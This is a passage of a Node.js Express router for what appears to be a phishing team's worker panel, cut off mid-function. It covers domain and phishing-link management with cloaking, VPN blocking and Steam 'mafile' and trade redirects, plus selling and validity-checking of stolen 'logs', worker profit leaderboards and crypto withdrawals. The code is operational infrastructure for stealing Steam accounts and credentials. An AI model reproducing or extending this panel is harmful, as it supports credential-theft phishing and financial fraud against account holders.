const express = require("express");
const { env } = require("../config/env");
const { logger } = require("../utils/logger");
const {
  verifyWorkerTelegramLogin,
  verifyWorkerTelegramWebApp,
  setWorkerSessionCookie,
  clearWorkerSessionCookie,
  requireWorker,
  canAccessWorkerPanel,
} = require("./userAuth");
const { requireWorkerOrAdmin } = require("./requireWorkerOrAdmin");
const { buildWorkspaces } = require("./workspaces");
const { ensureUser, getUserByTelegramId, listCurators, listCallers } = require("../services/userService");
const { serializeMember } = require("./serializers");
const { getCurrencyContext } = require("../services/currencyService");
const { formatDisplayAmount } = require("../services/currencyService");
const {
  listDomains,
  getWorkerDomainDetail,
  previewAddDomain,
  getDomainBindInfo,
  addDomain,
  removeDomain,
  listTemplates,
  createWorkerTemplate,
  deleteWorkerTemplate,
  createWorkerLink,
  updateWorkerLink,
  deleteWorkerLink,
  getWorkerLinkJournal,
  listWorkers,
} = require("../services/adminSitesService");
const { listWorkerLogs, listWorkerTasks } = require("../services/workerPanelService");
const { getWorkerOverview } = require("../services/workerDashboardService");
const { getTopWorkers, getTopWorkerProfile } = require("../services/topService");
const { getWorkerAlerts, markWorkerAlertsRead } = require("../services/workerAlertsService");
const {
  normalizeFakeProfitTag,
  randomFakeProfitTag,
  resolveFakeProfitTag,
  formatFakeProfitTagLabel,
} = require("../utils/fakeProfitTag");
const {
  createWithdrawalRequest,
  getAvailableUsd,
  methodLabel,
  getNetworkFeeUsd,
  loadWithdrawalFees,
  getMinWithdrawalUsd,
  isLinkPayoutMethod,
  isNicknamePayoutMethod,
  METHOD_LABELS,
  listUserRequests,
  countUserRequests,
  listPayoutRequisites,
  setPayoutRequisites,
  notifyWithdrawalRequestChannel,
} = require("../services/withdrawalService");
const { listUserProfits, countUserProfits, enrichProfitsWithSourceId } = require("../services/profitService");
const {
  lookupWorkerRecipient,
  transferWalletBalance,
  listUserTransfers,
  countUserTransfers,
  serializeTransferForUser,
  recipientDisplay,
} = require("../services/walletTransferService");
const { isAdminTelegramId } = require("../services/userService");
const {
  hashAppPassword,
  verifyAppPassword,
  verifyAppPasswordSafe,
  validateNewPassword,
  appLoginOf,
} = require("./appPassword");
const {
  authenticatorSetup,
  generateRecoveryCodes,
  hashRecoveryCodes,
  signSetupToken,
  verifySecondFactor,
  verifySetupToken,
} = require("./twoFactor");
const User = require("../models/User");
const {
  createFeedback,
  listUserFeedback,
  notifyAdminsAboutFeedback,
} = require("../services/feedbackService");
const {
  createCuratorApplication,
  getPendingApplication,
  buildCuratorApplicationNotifyHtml,
  curatorApplicationModerationKeyboard,
} = require("../services/curatorService");
const { serializeCuratorLike } = require("../services/workerTeamService");
const { requestSell, requestProcess, requestCheckValid, pollCheckValidStatus, getLogDetail, refreshLogDetail } = require("../services/workerLogActionsService");
const { docsSiteUrl, workerPanelAppUrl } = require("../utils/panelLinks");
const {
  getPublicSession,
  completeVerification,
  DiscordVerifyError,
} = require("../services/discordVerifyService");
const { finalizeVerification } = require("../discord/guild");
const { consumeImpersonationToken } = require("../services/adminImpersonationService");

// Avatar upload is handled via Telegram photos only.

function createUserRouter(bot) {
  const router = express.Router();

  router.get("/config", async (_req, res) => {
    const botId = String(env.botToken || "").split(":")[0] || "";
    const currencyCtx = await getCurrencyContext();
    res.json({
      botUsername: env.botUsername || "",
      botId,
      authDisabled: false,
      publicUrl: String(env.panelPublicUrl || "https://garbona.cc").replace(/\/$/, ""),
      supportUrl: env.supportUrl || "",
      manualsDocsUrl: docsSiteUrl(),
      changelogsUrl: env.changelogsUrl || "",
      aboutInfoChannelUrl: env.aboutInfoChannelUrl || "",
      minWithdrawalUsd: getMinWithdrawalUsd(),
      usdRubRate: currencyCtx.rate,
      globalCurrency: currencyCtx.currency,
    });
  });

  router.post("/auth/telegram", async (req, res) => {
    try {
      if (env.panelAuthDisabled) {
        const telegramId = String(env.adminIds[0] || "").trim();
        if (!telegramId) return res.status(500).json({ error: "no_admin_ids" });
        setWorkerSessionCookie(res, telegramId);
        return res.json({ ok: true });
      }

      const result = verifyWorkerTelegramLogin(req.body || {});
      if (!result.ok) {
        return res.status(401).json({ error: result.error });
      }
      return finishWorkerLogin(res, result.user);
    } catch (error) {
      return res.status(500).json({ error: error.message || "auth_failed" });
    }
  });

  router.post("/auth/webapp", async (req, res) => {
    try {
      if (env.panelAuthDisabled) {
        const telegramId = String(env.adminIds[0] || "").trim();
        if (!telegramId) return res.status(500).json({ error: "no_admin_ids" });
        setWorkerSessionCookie(res, telegramId);
        return res.json({ ok: true });
      }

      const result = verifyWorkerTelegramWebApp(req.body?.initData || req.body?.init_data || "");
      if (!result.ok) {
        return res.status(401).json({ error: result.error });
      }
      return finishWorkerLogin(res, result.user);
    } catch (error) {
      return res.status(500).json({ error: error.message || "auth_failed" });
    }
  });

  router.post("/auth/password", async (req, res) => {
    try {
      if (env.panelAuthDisabled) {
        const telegramId = String(env.adminIds[0] || "").trim();
        if (!telegramId) return res.status(500).json({ error: "auth_unavailable" });
        setWorkerSessionCookie(res, telegramId);
        return res.json({ ok: true });
      }

      const login = String(req.body?.login || "").trim().replace(/^@/, "");
      const password = String(req.body?.password || "");
      const escaped = login.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      const user = login
        ? await User.findOne({
            $or: [
              { username: new RegExp(`^${escaped}$`, "i") },
              { telegramId: login },
            ],
          })
        : null;

      if (!verifyAppPasswordSafe(password, user?.appPasswordHash)) {
        return res.status(401).json({ error: "invalid_credentials" });
      }
      if (!canAccessWorkerPanel(user)) {
        return res.status(403).json({ error: "access_denied" });
      }

      const totpSecret = String(user.appTotpSecret || "").trim();
      if (totpSecret) {
        const code = String(req.body?.code || "").trim();
        if (!code) {
          return res.status(202).json({ ok: false, requiresTwoFactor: true });
        }
        const secondFactor = verifySecondFactor(code, totpSecret, user.appRecoveryCodeHashes);
        if (!secondFactor.ok) {
          return res.status(401).json({ error: "invalid_two_factor", requiresTwoFactor: true });
        }
        if (secondFactor.kind === "recovery") {
          const usedHash = user.appRecoveryCodeHashes[secondFactor.recoveryIndex];
          const consumed = await User.updateOne(
            { _id: user._id, appRecoveryCodeHashes: usedHash },
            { $pull: { appRecoveryCodeHashes: usedHash } }
          );
          if (consumed.modifiedCount !== 1) {
            return res.status(401).json({ error: "invalid_two_factor", requiresTwoFactor: true });
          }
        }
      }

      setWorkerSessionCookie(res, user.telegramId);
      return res.json({ ok: true });
    } catch (error) {
      logger.error("Worker password login failed", error);
      return res.status(500).json({ error: "auth_failed" });
    }
  });

  async function finishWorkerLogin(res, tg) {
    let user = await getUserByTelegramId(tg.telegramId);
    if (!user) {
      user = await ensureUser({
        id: tg.telegramId,
        username: tg.username,
        first_name: tg.firstName,
      });
    } else {
      user.username = tg.username || user.username;
      user.firstName = tg.firstName || user.firstName;
      await user.save();
    }

    const loginAvatar = String(tg.photoUrl || "").trim();
    if (/^https?:\/\//i.test(loginAvatar) && loginAvatar !== user.avatarUrl) {
      user.avatarUrl = loginAvatar;
      await user.save();
    }

    if (!canAccessWorkerPanel(user)) {
      return res.status(403).json({ error: "not_team_member" });
    }

    setWorkerSessionCookie(res, tg.telegramId);
    const currencyCtx = await getCurrencyContext();
    return res.json({
      ok: true,
      user: {
        ...serializeMember(user, currencyCtx),
        isAdmin: isAdminTelegramId(user.telegramId),
      },
    });
  }

  router.post("/auth/logout", (_req, res) => {
    clearWorkerSessionCookie(res);
    res.json({ ok: true });
  });

  /**
   * Consume a one-time admin impersonation token and establish a worker session cookie.
   * Must be opened on the worker host (PANEL_PUBLIC_URL) — admin/worker cookies are not shared.
   */
  router.get("/auth/impersonate", async (req, res) => {
    const appUrl = workerPanelAppUrl() || "/app/";
    try {
      const xf = String(req.headers["x-forwarded-for"] || "")
        .split(",")[0]
        .trim();
      const ip = xf || req.ip || req.socket?.remoteAddress || "";
      const result = await consumeImpersonationToken(req.query.token, { ip });
      if (!result.ok) {
        return res.redirect(302, `${appUrl}login?error=impersonate_${result.error}`);
      }
      setWorkerSessionCookie(res, result.telegramId);
      res.setHeader("Cache-Control", "no-store");
      return res.redirect(302, appUrl);
    } catch (error) {
      logger.error("Impersonation exchange failed", error);
      return res.redirect(302, `${appUrl}login?error=impersonate_failed`);
    }
  });

  router.get("/discord/session", async (req, res) => {
    try {
      const token = String(req.query.token || req.query.t || "").trim();
      const view = await getPublicSession(token);
      if (!view) return res.status(404).json({ error: "invalid_or_expired" });
      return res.json(view);
    } catch (error) {
      logger.error("Discord session lookup failed", error);
      return res.status(500).json({ error: "session_failed" });
    }
  });

  router.post("/discord/verify", requireWorker, async (req, res) => {
    try {
      const token = String(req.body?.token || "").trim();
      const result = await completeVerification({
        token,
        user: req.worker,
        method: "panel",
      });
      await finalizeVerification(result);
      return res.json({
        ok: true,
        discord: {
          id: result.session.discordId,
          username: result.session.discordUsername || "",
          globalName: result.session.discordGlobalName || "",
          displayName:
            result.session.discordGlobalName || result.session.discordUsername || "",
          avatarUrl: result.session.discordAvatarUrl || "",
        },
      });
    } catch (error) {
      if (error instanceof DiscordVerifyError) {
        return res.status(error.status || 400).json({ error: error.code, message: error.message });
      }
      logger.error("Panel Discord verify failed", error);
      return res.status(500).json({ error: "verify_failed" });
    }
  });

  router.get("/me", requireWorker, async (req, res) => {
    const currencyCtx = await getCurrencyContext();
    const isAdmin = isAdminTelegramId(req.worker.telegramId);
    res.json({
      user: {
        ...serializeMember(req.worker, currencyCtx),
        payoutMethod: req.worker.payoutMethod || "",
        payoutAddress: req.worker.payoutAddress || "",
        isAdmin,
      },
      workspaces: buildWorkspaces({ isAdmin }),
    });
  });

  router.get("/overview", requireWorker, async (req, res) => {
    try {
      const days = Math.min(30, Math.max(1, Number(req.query.days || 7)));
      res.json(await getWorkerOverview(req.worker, { days, q: req.query.q }));
    } catch (error) {
      res.status(error.status || 500).json({ error: error.message });
    }
  });

  router.get("/logs", requireWorker, async (req, res) => {
    try {
      res.json(
        await listWorkerLogs(req.worker, {
          offset: req.query.offset,
          limit: req.query.limit,
          q: req.query.q,
        })
      );
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/tasks", requireWorker, async (req, res) => {
    try {
      res.json(await listWorkerTasks(req.worker));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/top", requireWorker, async (req, res) => {
    try {
      const period = ["all", "24h", "7d", "30d"].includes(String(req.query.period || ""))
        ? String(req.query.period)
        : "7d";
      const limit = Math.min(30, Math.max(5, Number(req.query.limit || 10)));
      const rows = await getTopWorkers(period, limit);
      const me = String(req.worker.telegramId || "");
      res.json({
        period,
        rows: rows.map((row, index) => {
          const anonTag = row.isAnonymous ? formatFakeProfitTagLabel(row.fakeProfitTag) : "";
          return {
            rank: index + 1,
            telegramId: row.isAnonymous ? "" : row.telegramId || "",
            displayName: row.isAnonymous
              ? anonTag || "Аноним"
              : row.firstName || row.username || (row.telegramId ? `ID ${row.telegramId}` : "—"),
            username: row.isAnonymous ? "" : row.username || "",
            photoUrl: row.isAnonymous ? "" : row.photoUrl || "",
            fakeProfitTag: row.isAnonymous ? String(row.fakeProfitTag || "") : "",
            isAnonymous: Boolean(row.isAnonymous),
            isMe: !row.isAnonymous && me && String(row.telegramId) === me,
            totalUsd: Number(row.total || 0),
            count: Number(row.count || 0),
          };
        }),
      });
    } catch (error) {
      res.status(error.status || 500).json({ error: error.message });
    }
  });

  router.get("/top/profile/:telegramId", requireWorker, async (req, res) => {
    try {
      const chartPeriod = ["7d", "30d", "all"].includes(String(req.query.chartPeriod || ""))
        ? String(req.query.chartPeriod)
        : "7d";
      const profile = await getTopWorkerProfile(req.params.telegramId, chartPeriod);
      res.json(profile);
    } catch (error) {
      res.status(error.status || 500).json({ error: error.message });
    }
  });

  router.get("/alerts", requireWorker, async (req, res) => {
    try {
      const alerts = await getWorkerAlerts(req.worker);
      res.json({ alerts, count: alerts.length });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/alerts/read", requireWorker, async (req, res) => {
    try {
      const ids = Array.isArray(req.body?.ids) ? req.body.ids : [];
      await markWorkerAlertsRead(req.worker, ids);
      const alerts = await getWorkerAlerts(req.worker);
      res.json({ ok: true, alerts, count: alerts.length });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/sites/domains", requireWorker, async (req, res) => {
    try {
      const includeLinks =
        req.query.includeLinks === "1" ||
        req.query.includeLinks === "true" ||
        req.query.includeLinks === "yes";
      const force =
        req.query.force === "1" ||
        req.query.force === "true" ||
        req.query.refresh === "1" ||
        req.query.refresh === "true";
      if (force) {
        try {
          const { getPanelToken } = require("../handlers/sitesHandler");
          const { invalidateDomainCaches } = require("../services/apiService");
          const auth = await getPanelToken(req.worker);
          if (auth?.token) invalidateDomainCaches(auth.token);
        } catch (_) {
          /* best-effort cache bust */
        }
      }
      res.json(await listDomains(req.worker, { includeLinks }));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/sites/domains/check", requireWorker, async (req, res) => {
    try {
      res.json(await previewAddDomain(req.worker, req.body?.domain));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/sites/domains/bind-info", requireWorker, async (req, res) => {
    try {
      res.json(await getDomainBindInfo(req.worker));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/sites/domains/:id", requireWorker, async (req, res) => {
    try {
      res.json(await getWorkerDomainDetail(req.worker, req.params.id));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/sites/domains", requireWorker, async (req, res) => {
    try {
      res.json(
        await addDomain(req.worker, req.body?.domain, {
          bindType: req.body?.bindType || req.body?.type || "ip",
          isTransit: req.body?.isTransit === true || req.body?.isTransit === "true",
        }),
      );
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/sites/domains/:id", requireWorker, async (req, res) => {
    try {
      res.json(await removeDomain(req.worker, req.params.id));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/sites/templates", requireWorker, async (req, res) => {
    try {
      res.json(await listTemplates(req.worker));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/sites/templates", requireWorker, async (req, res) => {
    try {
      res.json(
        await createWorkerTemplate(req.worker, {
          name: req.body?.name,
          code: req.body?.code,
          isPublic: req.body?.isPublic === true || req.body?.isPublic === "true",
        })
      );
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/sites/templates/:id", requireWorker, async (req, res) => {
    try {
      res.json(await deleteWorkerTemplate(req.worker, req.params.id));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/public/template-preview/:id.jpg", async (req, res) => {
    try {
      const id = Number(String(req.params.id || "").replace(/\.jpg$/i, ""));
      if (!Number.isFinite(id) || id < 1) {
        return res.status(400).json({ error: "invalid_template_id" });
      }
      const { sendPreviewFile, hasLocalPreview, publicPreviewApiUrl } = require("../services/templatePreviewService");
      const { bootstrapTemplatePreviewFile } = require("../services/adminSitesService");

      if (!hasLocalPreview(id)) {
        await bootstrapTemplatePreviewFile(id);
      }

      if (!sendPreviewFile(res, id)) {
        return res.status(404).json({ error: "preview_unavailable", id, url: publicPreviewApiUrl(id) });
      }
      return undefined;
    } catch (error) {
      if (!res.headersSent) {
        res.status(error.status || 400).json({ error: error.message || "preview_error" });
      }
    }
  });

  router.get("/sites/templates/:id/preview", requireWorkerOrAdmin, async (req, res) => {
    try {
      const id = Number(req.params.id);
      if (!Number.isFinite(id) || id < 1) {
        return res.status(400).json({ error: "invalid_template_id" });
      }
      const {
        ensureLocalPreview,
        sendPreviewFile,
        hasLocalPreview,
      } = require("../services/templatePreviewService");
      const { getVisibleTemplates } = require("../services/settingsService");
      const { findTemplateById } = require("../services/apiService");
      const { getPanelToken } = require("../handlers/sitesHandler");

      if (!hasLocalPreview(id)) {
        let remoteUrl = "";
        const visible = await getVisibleTemplates();
        remoteUrl = visible.find((t) => Number(t.id) === id)?.preview || "";
        if (!remoteUrl && (req.worker || req.admin)) {
          try {
            const auth = await getPanelToken(req.worker || req.admin);
            const found = await findTemplateById(auth.token, id);
            remoteUrl = found?.preview || "";
          } catch {
            /* ignore */
          }
        }
        await ensureLocalPreview(id, remoteUrl);
      }

      if (!sendPreviewFile(res, id)) {
        return res.status(404).json({ error: "preview_unavailable" });
      }
      return undefined;
    } catch (error) {
      if (!res.headersSent) {
        res.status(error.status || 400).json({ error: error.message || "preview_error" });
      }
    }
  });

  router.post("/sites/domains/:id/links", requireWorker, async (req, res) => {
    try {
      res.json(
        await createWorkerLink(req.worker, req.params.id, {
          path: req.body?.path,
          templateId: req.body?.templateId,
          windowType: req.body?.windowType,
          iframe: req.body?.iframe,
          cloaking: req.body?.cloaking,
          ban_vpn: req.body?.ban_vpn,
          randPath: req.body?.randPath,
          logError: req.body?.logError,
          mafileError: req.body?.mafileError,
          mafileSteamRedirect: req.body?.mafileSteamRedirect,
          tradeError: req.body?.tradeError,
          logRedirect: req.body?.logRedirect,
          tradeRedirect: req.body?.tradeRedirect,
          mafileRedirect: req.body?.mafileRedirect,
        })
      );
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.patch("/sites/domains/:domainId/links/:linkId", requireWorker, async (req, res) => {
    try {
      res.json(
        await updateWorkerLink(req.worker, req.params.domainId, req.params.linkId, {
          path: req.body?.path,
          templateId: req.body?.templateId,
          windowType: req.body?.windowType,
          iframe: req.body?.iframe,
          cloaking: req.body?.cloaking,
          logError: req.body?.logError,
          mafileError: req.body?.mafileError,
          mafileSteamRedirect: req.body?.mafileSteamRedirect,
          tradeError: req.body?.tradeError,
          logRedirect: req.body?.logRedirect,
          tradeRedirect: req.body?.tradeRedirect,
          mafileRedirect: req.body?.mafileRedirect,
        })
      );
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/sites/domains/:domainId/links/:linkId", requireWorker, async (req, res) => {
    try {
      res.json(await deleteWorkerLink(req.worker, req.params.domainId, req.params.linkId));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/sites/domains/:domainId/links/:linkId/journal", requireWorker, async (req, res) => {
    try {
      res.json(await getWorkerLinkJournal(req.worker, req.params.domainId, req.params.linkId));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/team/workers", requireWorker, async (req, res) => {
    try {
      res.json(await listWorkers(req.worker));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/settings", requireWorker, async (req, res) => {
    await loadWithdrawalFees();
    const currencyCtx = await getCurrencyContext();
    const methods = Object.keys(METHOD_LABELS || {}).map((key) => ({
      id: key,
      label: methodLabel(key),
      feeUsd: getNetworkFeeUsd(key),
      linkPayout: isLinkPayoutMethod(key),
      nicknamePayout: isNicknamePayoutMethod(key),
    }));
    res.json({
      user: {
        ...serializeMember(req.worker, currencyCtx),
        payoutMethod: req.worker.payoutMethod || "",
        payoutAddress: req.worker.payoutAddress || "",
        payoutRequisites: listPayoutRequisites(req.worker),
        appLogin: appLoginOf(req.worker),
        hasAppPassword: Boolean(req.worker.appPasswordHash),
        hasTwoFactor: Boolean(req.worker.appTotpSecret),
        recoveryCodesRemaining: Array.isArray(req.worker.appRecoveryCodeHashes)
          ? req.worker.appRecoveryCodeHashes.length
          : 0,
      },
      methods,
      minWithdrawalUsd: getMinWithdrawalUsd(),
      supportUrl: env.supportUrl || "",
    });
  });

  router.post("/settings/password", requireWorker, async (req, res) => {
    try {
      const current = String(req.body?.currentPassword || "");
      const next = String(req.body?.newPassword || "");
      const confirm = String(req.body?.confirmPassword || "");
      const hasPassword = Boolean(req.worker.appPasswordHash);

      if (next !== confirm) {
        return res.status(400).json({ error: "Пароли не совпадают" });
      }
      const check = validateNewPassword(next);
      if (!check.ok) {
        return res.status(400).json({ error: check.error });
      }
      if (hasPassword) {
        if (!current) {
          return res.status(400).json({ error: "Введите текущий пароль" });
        }
        if (!verifyAppPassword(current, req.worker.appPasswordHash)) {
          return res.status(400).json({ error: "Неверный текущий пароль" });
        }
        if (current === next) {
          return res.status(400).json({ error: "Новый пароль должен отличаться от текущего" });
        }
      }

      req.worker.appPasswordHash = hashAppPassword(next);
      await req.worker.save();
      return res.json({ ok: true, hasAppPassword: true });
    } catch (error) {
      return res.status(400).json({ error: error.message || "password_change_failed" });
    }
  });

  router.post("/settings/2fa/setup", requireWorker, async (req, res) => {
    try {
      if (req.worker.appTotpSecret) return res.status(409).json({ error: "two_factor_enabled" });
      if (!req.worker.appPasswordHash) return res.status(400).json({ error: "password_required" });
      if (!verifyAppPassword(String(req.body?.currentPassword || ""), req.worker.appPasswordHash)) {
        return res.status(401).json({ error: "invalid_current_password" });
      }
      const setup = authenticatorSetup(appLoginOf(req.worker));
      return res.json({
        secret: setup.secret,
        otpauthUri: setup.uri,
        qrSvg: setup.qrSvg,
        setupToken: signSetupToken({ telegramId: req.worker.telegramId, secret: setup.secret }),
        expiresInSeconds: 600,
      });
    } catch (error) {
      logger.error("2FA setup failed", error);
      return res.status(500).json({ error: "two_factor_setup_failed" });
    }
  });

  router.post("/settings/2fa/confirm", requireWorker, async (req, res) => {
    try {
      if (req.worker.appTotpSecret) return res.status(409).json({ error: "two_factor_enabled" });
      const setup = verifySetupToken(req.body?.setupToken, req.worker.telegramId);
      if (!setup) return res.status(400).json({ error: "setup_expired" });
      if (!verifySecondFactor(String(req.body?.code || ""), setup.secret, []).ok) {
        return res.status(400).json({ error: "invalid_two_factor" });
      }
      const recoveryCodes = generateRecoveryCodes();
      req.worker.appTotpSecret = setup.secret;
      req.worker.appRecoveryCodeHashes = hashRecoveryCodes(recoveryCodes);
      req.worker.appTotpEnabledAt = new Date();
      await req.worker.save();
      return res.json({ ok: true, recoveryCodes, recoveryCodesRemaining: recoveryCodes.length });
    } catch (error) {
      logger.error("2FA confirmation failed", error);
      return res.status(500).json({ error: "two_factor_confirm_failed" });
    }
  });

  router.post("/settings/2fa/recovery-codes", requireWorker, async (req, res) => {
    try {
      const secret = String(req.worker.appTotpSecret || "");
      if (!secret) return res.status(409).json({ error: "two_factor_disabled" });
      if (!verifyAppPassword(String(req.body?.currentPassword || ""), req.worker.appPasswordHash)) {
        return res.status(401).json({ error: "invalid_current_password" });
      }
      if (!verifySecondFactor(String(req.body?.code || ""), secret, req.worker.appRecoveryCodeHashes).ok) {
        return res.status(400).json({ error: "invalid_two_factor" });
      }
      const recoveryCodes = generateRecoveryCodes();
      req.worker.appRecoveryCodeHashes = hashRecoveryCodes(recoveryCodes);
      await req.worker.save();
      return res.json({ ok: true, recoveryCodes, recoveryCodesRemaining: recoveryCodes.length });
    } catch (error) {
      return res.status(500).json({ error: "recovery_codes_failed" });
    }
  });

  router.post("/settings/2fa/disable", requireWorker, async (req, res) => {
    try {
      const secret = String(req.worker.appTotpSecret || "");
      if (!secret) return res.status(409).json({ error: "two_factor_disabled" });
      if (!verifyAppPassword(String(req.body?.currentPassword || ""), req.worker.appPasswordHash)) {
        return res.status(401).json({ error: "invalid_current_password" });
      }
      if (!verifySecondFactor(String(req.body?.code || ""), secret, req.worker.appRecoveryCodeHashes).ok) {
        return res.status(400).json({ error: "invalid_two_factor" });
      }
      req.worker.appTotpSecret = "";
      req.worker.appRecoveryCodeHashes = [];
      req.worker.appTotpEnabledAt = null;
      await req.worker.save();
      return res.json({ ok: true, hasTwoFactor: false });
    } catch (error) {
      return res.status(500).json({ error: "two_factor_disable_failed" });
    }
  });

  router.patch("/settings", requireWorker, async (req, res) => {
    try {
      if (Array.isArray(req.body?.payoutRequisites)) {
        setPayoutRequisites(req.worker, req.body.payoutRequisites);
      } else {
        const method = String(req.body?.payoutMethod || "").trim();
        const address = String(req.body?.payoutAddress || "").trim();
        if (method && address) {
          const current = listPayoutRequisites(req.worker);
          const normalizedAddress = address.replace(/\s+/g, "");
          const exists = current.some(
            (row) =>
              row.method === method && row.address.toLowerCase() === normalizedAddress.toLowerCase()
          );
          if (!exists) current.unshift({ method, address });
          setPayoutRequisites(req.worker, current);
        } else if (method && !METHOD_LABELS[method]) {
          return res.status(400).json({ error: "Неизвестный метод выплат" });
        }
      }
      if (req.body?.isAnonymous != null) {
        req.worker.isAnonymous = Boolean(req.body.isAnonymous);
        if (req.worker.isAnonymous && !normalizeFakeProfitTag(req.worker.fakeProfitTag)) {
          req.worker.fakeProfitTag = randomFakeProfitTag();
        }
      }
      if (req.body?.autoSellLogs != null) {
        req.worker.autoSellLogs = Boolean(req.body.autoSellLogs);
      }
      if (req.body?.fakeProfitTagRandom) {
        req.worker.fakeProfitTag = randomFakeProfitTag();
      } else if (req.body?.fakeProfitTag != null) {
        req.worker.fakeProfitTag = resolveFakeProfitTag(req.body.fakeProfitTag);
      }
      if (req.body?.bio != null) {
        req.worker.bio = String(req.body.bio || "").slice(0, 500);
      }
      await req.worker.save();
      const currencyCtx = await getCurrencyContext();
      res.json({
        ok: true,
        user: {
          ...serializeMember(req.worker, currencyCtx),
          payoutMethod: req.worker.payoutMethod || "",
          payoutAddress: req.worker.payoutAddress || "",
          payoutRequisites: listPayoutRequisites(req.worker),
        },
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/wallet/withdraw", requireWorker, async (req, res) => {
    try {
      const amount = Number(req.body?.amount);
      const method = String(req.body?.method || req.worker.payoutMethod || "").trim();
      const address = String(req.body?.address || req.worker.payoutAddress || "").trim();
      const created = await createWithdrawalRequest(req.worker, amount, method, address);
      await notifyWithdrawalRequestChannel(bot, created);
      res.json({
        ok: true,
        request: {
          id: String(created._id || ""),
          status: created.status,
          amountUsd: Number(created.amountUsd || 0),
          method: created.method,
          walletAddress: created.walletAddress || "",
          createdAt: created.createdAt || null,
        },
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/wallet/transfer/lookup", requireWorker, async (req, res) => {
    try {
      const query = String(req.query?.q || req.query?.query || "").trim();
      if (!query) {
        return res.status(400).json({ error: "Укажите username, ID или custom ID получателя." });
      }
      const recipient = await lookupWorkerRecipient(query);
      if (!recipient) {
        return res.status(404).json({ error: "Получатель не найден или не является воркером." });
      }
      if (String(recipient.telegramId) === String(req.worker.telegramId)) {
        return res.status(400).json({ error: "Нельзя перевести средства самому себе." });
      }
      res.json({ ok: true, recipient });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/wallet/transfer", requireWorker, async (req, res) => {
    try {
      const amount = Number(req.body?.amount);
      const recipientQuery = String(
        req.body?.recipient || req.body?.to || req.body?.query || ""
      ).trim();
      if (!recipientQuery) {
        return res.status(400).json({ error: "Укажите получателя перевода." });
      }
      const result = await transferWalletBalance(req.worker, recipientQuery, amount);
      // Обновляем req.worker, чтобы последующие чтения в этой сессии видели новый баланс.
      req.worker.totalProfit = result.sender.totalProfit;
      res.json({
        ok: true,
        amountUsd: result.amountUsd,
        availableUsd: await getAvailableUsd(result.sender),
        walletUsd: Number(result.sender.totalProfit || 0),
        recipient: recipientDisplay(result.recipient),
        transfer: {
          id: String(result.transfer._id),
          createdAt: result.transfer.createdAt || null,
          amountUsd: result.amountUsd,
          direction: "out",
          peerTelegramId: String(result.recipient.telegramId),
          peerUsername: result.recipient.username || "",
          type: "transfer",
        },
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/wallet", requireWorker, async (req, res) => {
    try {
      await loadWithdrawalFees();
      const currencyCtx = await getCurrencyContext();
      const methods = Object.keys(METHOD_LABELS || {}).map((key) => ({
        id: key,
        label: methodLabel(key),
        feeUsd: getNetworkFeeUsd(key),
        linkPayout: isLinkPayoutMethod(key),
        nicknamePayout: isNicknamePayoutMethod(key),
      }));

      const walletUsd = Number(req.worker.totalProfit || 0);
      const availableUsd = Number(await getAvailableUsd(req.worker));
      const availableDisplay = formatDisplayAmount(availableUsd, currencyCtx);
      const frozenSaleUsd = Number(req.worker.frozenSaleUsd || 0);
      const reservedWithdrawalUsd = Number(req.worker.reservedWithdrawalUsd || 0);
      const reservedUsd = Number((walletUsd - availableUsd).toFixed(2));

      res.json({
        user: {
          ...serializeMember(req.worker, currencyCtx),
          payoutMethod: req.worker.payoutMethod || "",
          payoutAddress: req.worker.payoutAddress || "",
          payoutRequisites: listPayoutRequisites(req.worker),
        },
        walletUsd,
        availableUsd,
        reservedUsd: Math.max(0, reservedUsd),
        reservedWithdrawalUsd,
        frozenSaleUsd,
        availableDisplay,
        minWithdrawalUsd: getMinWithdrawalUsd(),
        methods,
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/wallet/history", requireWorker, async (req, res) => {
    try {
      const tab = String(req.query.tab || "profits").trim();
      const limit = Math.min(50, Math.max(1, Number(req.query.limit || 10)));
      const requestedPage = Math.max(0, Number.parseInt(req.query.page, 10) || 0);

      function pageMeta(total) {
        const pageCount = Math.max(1, Math.ceil(Number(total || 0) / limit) || 1);
        const page = Math.min(requestedPage, pageCount - 1);
        return { page, pageCount, skip: page * limit, total: Number(total || 0) };
      }

      if (tab === "profits") {
        const total = await countUserProfits(req.worker);
        const meta = pageMeta(total);
        const rows = await enrichProfitsWithSourceId(
          await listUserProfits(req.worker, limit, meta.skip)
        );
        return res.json({
          tab,
          items: (rows || []).map((p) => {
            const kind = String(p.kind || "profit");
            return {
              id: String(p._id || ""),
              createdAt: p.createdAt || null,
              amountUsd: Number(p.workerShare || 0),
              type: kind === "transfer_in" || kind === "wallet_credit" ? kind : "profit",
              kind,
              note: p.note || "",
              sourceId: String(p.sourceId || ""),
              actorTelegramId: p.adminTelegramId || "",
